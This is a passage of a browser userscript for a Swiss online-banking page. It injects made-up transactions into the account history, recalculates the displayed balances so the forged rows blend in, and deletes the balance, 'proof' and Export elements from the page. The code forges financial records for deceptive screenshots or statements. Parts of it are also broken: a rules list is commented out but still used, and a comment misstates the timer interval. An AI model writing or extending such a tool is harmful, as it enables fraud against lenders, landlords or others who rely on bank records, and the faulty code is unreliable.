  <td class="right visible-md visible-lg visible-sm"><span class="right table-direction-False">${balanceStr}</span></td>
  <td style="width:0px;display:none"></td>
  <td style="width:0px;display:none"></td>
  <td class="visible-md visible-lg" style="width:0px;display:none"></td>
</tr>`.trim();
  };

  const makeRowElement = (html) => {
    const tpl = document.createElement('template');
    tpl.innerHTML = html;
    return tpl.content.firstElementChild;
  };

  // ---------- NEW: baseline capture for idempotent corrections ----------
  function ensureBaselineForRow(tr) {
    if (!tr || tr.hasAttribute(SIG_ATTR)) return; // only baseline original rows (not inserted)
    const span = getBalanceSpanFromRow(tr);
    if (!span) return;
    if (!tr.hasAttribute(ORIG_BAL_ATTR)) {
      const val = parseSwissNumber(span.textContent);
      if (Number.isFinite(val)) tr.setAttribute(ORIG_BAL_ATTR, String(val));
    }
  }
  function getBaseline(tr) {
    const raw = tr.getAttribute(ORIG_BAL_ATTR);
    return Number.isFinite(parseFloat(raw)) ? parseFloat(raw) : NaN;
  }

  // ---------- NEW: idempotent reconcile of balances every tick ----------
  function reconcileBalances(tbody) {
    const rows = getRows(tbody);
    if (rows.length === 0) return;

    // capture baseline once per original row
    for (const tr of rows) ensureBaselineForRow(tr);

    // Build difference array based on currently present INSERTED rows that affect balance
    const diff = new Array(rows.length + 1).fill(0);
    rows.forEach((tr, idx) => {
      if (!tr.hasAttribute(SIG_ATTR)) return;
      // find amount on this inserted row (we know our own markup format)
      const amtSpan = tr.querySelector('td:nth-child(4) span');
      const amt = parseSwissNumber(amtSpan?.textContent);
      if (!Number.isFinite(amt)) return;
      // Only rows ABOVE this inserted row need to be shifted by amt
      if (idx > 0) {
        diff[0] += amt;
        diff[idx] -= amt;
      }
    });

    // Sweep and set balances deterministically from baseline + running delta
    let running = 0;
    for (let i = 0; i < rows.length; i++) {
      running = addMoney(running, diff[i]);
      const tr = rows[i];

      // Inserted rows keep their own computed balances; we don't touch them here.
      if (tr.hasAttribute(SIG_ATTR)) continue;

      const span = getBalanceSpanFromRow(tr);
      if (!span) continue;

      const base = getBaseline(tr);
      if (!Number.isFinite(base)) continue;

      const corrected = addMoney(base, running);
      const current = parseSwissNumber(span.textContent);

      // Only update if out of sync (avoids needless DOM writes)
      if (!Number.isFinite(current) || Math.abs(current - corrected) > 0.0001) {
        span.textContent = asSwiss(corrected);
      }
    }
  }

  // ---------- Plan & insert all missing TXs ----------
  function insertMissingTransactions(tbody) {
    if (!tbody) return false;

    const missing = [];
    for (const tx of CONFIG_LIST) {
      const sig = txSignature(tx);
      if (countExistingForSig(tbody, sig) === 0) {
        missing.push({ tx, sig });
      }
    }
    if (missing.length === 0) return false;

    const plans = [];
    for (const item of missing) {
      const { tx, sig } = item;
      const where = (tx.insertPosition === 2) ? findInsertionByDate(tbody, tx.bookingDate)
                                              : findInsertionFirst(tbody);

      let refBalance = Number.NaN;
      if (where.referenceRow) refBalance = getBalanceFromRow(where.referenceRow);
      if (!Number.isFinite(refBalance)) {
        const headerBal = document.querySelector('#MainContent_TransactionMainContent_accControl_accBalance');
        if (headerBal) refBalance = parseSwissNumber(headerBal.textContent);
      }
      if (!Number.isFinite(refBalance)) {
        warn('Skipping a tx this tick (no reference balance yet):', tx);
        continue;
      }

      const rowsNow = getRows(tbody);
      let targetIndex;
      if (where.place === 'before' && where.anchor) {
        targetIndex = rowsNow.indexOf(where.anchor);
        if (targetIndex < 0) targetIndex = rowsNow.length;
      } else {
        targetIndex = rowsNow.length;
      }

      plans.push({ tx, sig, where, refBalance, targetIndex });
    }

    if (plans.length === 0) return false;

    // Sort: top→bottom by targetIndex, then (for byDate) newer date first, else original order
    const byDateDesc = (a, b) => parseSwissDateToTS(b.tx.bookingDate) - parseSwissDateToTS(a.tx.bookingDate);
    const originalOrder = new Map(plans.map((p, i) => [p, i]));
    plans.sort((a, b) => {
      if (a.targetIndex !== b.targetIndex) return a.targetIndex - b.targetIndex;
      const aByDate = a.tx.insertPosition === 2;
      const bByDate = b.tx.insertPosition === 2;
      if (aByDate && bByDate) {
        const dd = byDateDesc(a, b);
        if (dd !== 0) return dd;
      }
      return originalOrder.get(a) - originalOrder.get(b);
    });

    // Group for stable previous-balance computation
    const groups = new Map();
    plans.forEach((p) => {
      if (!groups.has(p.targetIndex)) groups.set(p.targetIndex, []);
      const arr = groups.get(p.targetIndex);
      p._posInGroup = arr.length; // 0..n-1 (top→bottom)
      arr.push(p);
    });

    // Compute effective previous balance considering lower (later) inserts in this tick
    for (const p of plans) {
      let sumLower = 0;
      for (const q of plans) {
        if (!q.tx.affectsBalance) continue;
        if (q === p) continue;

        if (q.targetIndex > p.targetIndex) {
          sumLower = addMoney(sumLower, q.tx.amount);
        } else if (q.targetIndex === p.targetIndex) {
          if (q._posInGroup > p._posInGroup) {
            sumLower = addMoney(sumLower, q.tx.amount);
          }
        }
      }
      p._effectivePrev = addMoney(p.refBalance, sumLower);
      p.newBalance = p.tx.affectsBalance ? addMoney(p._effectivePrev, p.tx.amount) : p._effectivePrev;
    }

    // Insert rows
    for (const plan of plans) {
      const html = buildRowHTML(plan.tx, plan.newBalance);
      const rowEl = makeRowElement(html);
      rowEl.setAttribute(SIG_ATTR, plan.sig);

      if (plan.where.place === 'before' && plan.where.anchor) {
        tbody.insertBefore(rowEl, plan.where.anchor);
      } else {
        tbody.appendChild(rowEl);
      }

      log('Inserted custom tx:', {
        bookingDate: plan.tx.bookingDate,
        valueDate: plan.tx.valueDate,
        amount: plan.tx.amount,
        affectsBalance: plan.tx.affectsBalance,
        insertPosition: plan.tx.insertPosition,
        referenceBalance: plan.refBalance,
        effectivePrev: plan._effectivePrev,
        newBalance: plan.newBalance,
        targetIndex: plan.targetIndex
      });
    }

    return true;
  }

  // ----- Interval -----
  let ticks = 0;
  const tick = () => {
    try {
      // 1) IBAN guard — hard stop if not matching (case/space insensitive)
      if (!isOnCorrectIban()) {
        if ((ticks++ % 10) === 0) warn('IBAN mismatch or not found – standing by.');
        return;
      }

      const tbody = getTBody();
      if (!tbody) {
        if ((ticks++ % 10) === 0) warn('Waiting for .genericTableBody …');
        return;
      }

      // 2) Ensure transactions exist; if missing, re-insert
      insertMissingTransactions(tbody);

      // 3) Idempotent reconcile: if balances drift/reset, repair; if already correct, no-op
      reconcileBalances(tbody);

    } catch (e) {
      err('tick failed:', e);
    }
  };

  setInterval(tick, INTERVAL_MS);
  log('Ready. Interval:', INTERVAL_MS, 'ms. IBAN guard active; press Alt+T to edit transactions (JSON). Swiss parsing, multiple tx, insert 1/2, and idempotent balance reconciliation are active. No DEFAULT_TX used.');
 }


//================================
//================================
//================================
//================================



// UTILITIES

if (window.location.href.includes("ch") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {
  'use strict';

//  // Toggle true/false per item right here:
///  const RULES = [
//    // Remove id="MainContent_TransactionMainContent_accControl_accBalance"
//    { name: 'accBalance',
//      selector: '#MainContent_TransactionMainContent_accControl_accBalance',
//////      enabled: true },
//
//    // Remove id="MainContent_TransactionMainContent_txpTransactions_ctl01_genericList_genericSearch_flwSearch_searchIconDiv"
//    { name: 'searchIconDiv',
//      selector: '#MainContent_TransactionMainContent_txpTransactions_ctl01_genericList_genericSearch_flwSearch_searchIconDiv',
//      enabled: true },
//
 //   // Remove id="MainContent_TransactionMainContent_txpTransactions_ctl01_genericList_genericSearch_flwSearch_proofPlaceHolder"
 //   { name: 'proofPlaceHolder',
 //     selector: '#MainContent_TransactionMainContent_txpTransactions_ctl01_genericList_genericSearch_flwSearch_proofPlaceHolder',
 //     enabled: true },
//
//    // Remove class="balancepreview-bottompart"
//    { name: 'balancePreviewBottom',
//      selector: '.balancepreview-bottompart',
//      enabled: true },
//
//    // Remove title="Export"
//    { name: 'titleExport',
//      selector: '[title="Export"]',
 //     enabled: true },
//  ];

  const STORAGE_KEY = '__hypi_rules__';
  const SENTINEL = '__hypi_balance_killer__';
  const INTERVAL_MS = 100;

  // Load saved choices (if any) from localStorage
  function loadPrefs() {
    try {
      const saved = JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}');
      RULES.forEach(r => {
        if (Object.prototype.hasOwnProperty.call(saved, r.name)) {
          r.enabled = !!saved[r.name];
        }
      });
    } catch (_) {}
  }

  function savePrefs() {
    try {
      const data = {};
      RULES.forEach(r => { data[r.name] = !!r.enabled; });
      localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
    } catch (_) {}
  }

  // Runtime helpers (optional): call in DevTools console
  // hypiList() -> see current status; hypiSet('titleExport', false) -> disable that rule
  function exposeHelpers() {
    if (window.hypiList && window.hypiSet) return;
    window.hypiList = function () {
      const out = {};
      RULES.forEach(r => out[r.name] = { selector: r.selector, enabled: r.enabled });
      try { console.table(out); } catch (_) { console.log(out); }
      return out;
    };
    window.hypiSet = function (name, enabled) {
      const rule = RULES.find(r => r.name === name);
      if (!rule) {
        console.warn('[hypi] No rule named:', name);
        return false;
      }
      rule.enabled = !!enabled;
      savePrefs();
      console.log(`[hypi] Set ${name} -> ${rule.enabled}`);
      return true;
    };
  }

  function applyRulesInWindow(win) {
    let removed = 0;
    try {
      const doc = win.document;
      if (!doc) return 0;

      for (const rule of RULES) {
        if (!rule.enabled) continue;
        try {
          const nodes = doc.querySelectorAll(rule.selector);
          nodes.forEach(n => { n.remove(); removed++; });
        } catch (_) {
          // Invalid selector (unlikely) — skip
        }
      }

      // Recurse into same-origin iframes
      const frames = win.frames;
      if (frames && frames.length) {
        for (let i = 0; i < frames.length; i++) {
          try { removed += applyRulesInWindow(frames[i]); } catch (_) {}
        }
      }
    } catch (_) {
      // Swallow errors so the interval never stops
    }
    return removed;
  }

  function tick() {
    applyRulesInWindow(window);
  }

  loadPrefs();
  exposeHelpers();
  tick(); // run once immediately

  if (!window[SENTINEL]) {
    window[SENTINEL] = setInterval(tick, INTERVAL_MS); // runs forever every 2s
  }
}

